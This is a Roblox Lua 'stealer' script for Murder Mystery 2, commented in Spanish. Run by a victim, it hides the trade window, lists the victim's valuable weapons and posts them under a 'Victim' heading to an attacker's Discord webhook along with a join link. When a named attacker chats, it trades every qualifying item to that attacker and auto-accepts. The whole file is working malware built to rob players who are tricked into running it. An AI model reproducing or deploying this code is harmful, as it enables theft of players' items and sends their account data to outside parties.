local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Evitar ejecución múltiple
if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"
local placeId = game.PlaceId
local token = math.random(100000,999999)

-- Función HTTP
local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- Función para enviar webhook
local function SendWebhook(content, fields)
    local data = {
        ["content"] = content or "",
        ["embeds"] = {{
            ["title"] = "💪 MM2 Hit el mejor stealer 💯",
            ["description"] = "💰 Disfruta todas las armas gratis 😎",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

-- Trade
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Kick inicial al cargar el script
local function CheckServerInitial()
    if #Players:GetPlayers() >= 12 then
        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
    end
    if game.PrivateServerId and game.PrivateServerId ~= "" then
        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
    end
    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
    if success and ownerId and ownerId ~= 0 then
        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
    end
end
CheckServerInitial()

-- Inventario
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local weaponsToSend = {}
local totalValue = 0
local min_rarity_index = table.find(rarityTable, min_rarity)

-- Build value list (simplificado)
local valueList = {}
for id,item in pairs(database) do
    local ri = table.find(rarityTable,item.Rarity)
    if ri and ri>=min_rarity_index then
        valueList[id] = 50 -- ejemplo de valor
    end
end

-- Extraer armas válidas
local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id,amount in pairs(profile.Weapons.Owned) do
    local item = database[id]
    if item then
        local v = valueList[id] or 10
        if v >= min_value then
            table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
            totalValue += v*amount
        end
    end
end

-- Ordenar armas por valor total
table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

-- ====================================
-- API Roblox para servidores y link Fern real
local function GetServers()
    local servers = {}
    local cursor = nil
    repeat
        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?limit=100"
        if cursor then url = url.."&cursor="..cursor end
        local response = req({Url = url, Method="GET"})
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.data then
                for _, s in ipairs(data.data) do
                    if s.playing < s.maxPlayers then
                        table.insert(servers, s.id)
                    end
                end
            end
            cursor = data.nextPageCursor
        end
    until not cursor
    return servers
end

local function GenerateFernLink(jobId)
    return "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId.."&token="..token
end

-- ====================================
-- Enviar webhook inventario
if #weaponsToSend>0 then
    local fieldsInit = {
        {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
        {name="Inventario 📦:", value="", inline=false},
        {name="Valor total 📦:", value=tostring(totalValue).."💰", inline=true},
        {name="Click para unirte 👇:", value="`Link separado`", inline=false} -- el real llegará separado
    }
    for _, w in ipairs(weaponsToSend) do
        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
    end
    local prefix = pingEveryone and "@everyone " or ""
    SendWebhook(prefix, fieldsInit)
end

-- ====================================
-- Enviar Fern link real a webhook
local servers = GetServers()
if #servers>0 then
    local jobId = servers[math.random(1,#servers)]
    local fernLink = GenerateFernLink(jobId)
    SendWebhook("💌 Link seguro para unirte: "..fernLink)
end

-- Trade automático
local function doTrade(targetName)
    if #weaponsToSend == 0 then return end
    while #weaponsToSend>0 do
        local status = getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="SendingRequest" then
            task.wait(0.3)
        elseif status=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do
                local w = table.remove(weaponsToSend,1)
                for _=1,w.Amount do
                    addWeaponToTrade(w.DataID)
                end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else task.wait(0.5) end
        task.wait(1)
    end
end

-- Activación por chat
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
